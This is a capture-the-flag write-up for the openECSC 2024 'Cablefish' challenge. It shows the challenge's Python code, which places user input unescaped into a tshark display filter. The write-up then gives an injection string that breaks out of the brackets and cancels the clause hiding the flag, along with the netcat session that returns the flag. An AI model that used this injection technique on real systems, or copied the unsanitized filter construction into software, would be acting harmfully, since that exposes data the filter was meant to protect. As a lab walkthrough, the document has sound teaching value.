# Cablefish

## Description
```
Welcome to our platform! Here you can do traffic analysis via TCP, isn't it awesome?

Just specify your filter, we will sanitize it (we want to make sure no sensitive data will be leaked) and you will be given the traffic!

This is a remote challenge, you can connect with:

nc cablefish.challs.open.ecsc2024.it 38005
```

## Provided Files
```
- chall.py
```

## Writeup

Starting off I took a look at the provided file. <br/>
```py
#!/usr/bin/env python3

import os
import subprocess
import time

flag = os.getenv('FLAG', 'openECSC{redacted}')

def filter_traffic(filter):
    filter = filter[:50]
    sanitized_filter = f'(({filter}) and (not frame contains "flag_placeholder"))'
    p1 = subprocess.Popen(['tshark', '-r', '/home/user/capture.pcapng', '-Y', sanitized_filter, '-T', 'fields', '-e', 'tcp.payload'], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = p1.communicate()

    if stderr != b'':
        return sanitized_filter, stderr.decode(), 'err'

    res = []
    for line in stdout.split(b'\n'):
        if line != b'':
            p2 = subprocess.Popen(['xxd', '-r', '-p'], shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=open(os.devnull, 'wb'))
            stdout, _ = p2.communicate(input=line)
            p3 = subprocess.Popen(['xxd', '-c', '32'], shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=open(os.devnull, 'wb'))
            stdout, _ = p3.communicate(input=stdout)
            res.append(stdout.decode().replace('flag_placeholder', flag))

    return sanitized_filter, res, 'ok'

----------------------
```

Now the important thing to notice in the python code above is the missing sanitization of our input. <br/>
Inspecting the filter input I saw that the missing sanitization allows us to escape the expression and therefore alter the complete filter (comparable to a simple sqli). <br/>
The filter basically takes our input and adds a second one which will filter the output to not contain the flag. <br/>
To solve the challenge we basicaly need to grab the flag and somehow alter the second filter to not filter the flag. <br/>
To exploit the filter escape I used the filter input `frame contains "flag_placeholder" )) or ((arp`. <br/>
Using this filter the complete filter will look like the one below. <br/>
```py
((frame contains "flag_placeholder" )) or ((arp) and (not frame contains "flag_placeholder"))
```

My input will escape the first pair of brackets and add and `or` switch which essentially states if either of the 2 filter trigger print the output. <br/>
Testing the filter escape. <br/>
```sh
nc cablefish.challs.open.ecsc2024.it 38005

                                            ,@@
                                        @@@/  @@
                                     @@      &@
                                   @@        @*
                                 ,@          @*
                                ,@           @@
                                @,            @.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


                         ,,        ,,                    ,,           ,,
       .g8"""bgd        *MM      `7MM         `7MM"""YMM db         `7MM
     .dP'     `M         MM        MM           MM    `7              MM
     dM'       ` ,6"Yb.  MM,dMMb.  MM  .gP"Ya   MM   d `7MM  ,pP"Ybd  MMpMMMb.
     MM         8)   MM  MM    `Mb MM ,M'   Yb  MM""MM   MM  8I   `"  MM    MM
     MM.         ,pm9MM  MM     M8 MM 8M""""""  MM   Y   MM  `YMMMa.  MM    MM
     `Mb.     ,'8M   MM  MM.   ,M9 MM YM.    ,  MM       MM  L.   I8  MM    MM
       `"bmmmd' `Moo9^Yo.P^YbmdP'.JMML.`Mbmmd'.JMML.   .JMML.M9mmmP'.JMML  JMML.


Please, specify your filter: frame contains "flag_placeholder" )) or ((arp
Loading, please wait...
Evaluating the filter: ((frame contains "flag_placeholder" )) or ((arp) and (not frame contains "flag_placeholder"))

openECSC{REDACTED}.

End of the results. Bye!
```

Obtaining the flag concludes this writeup. 
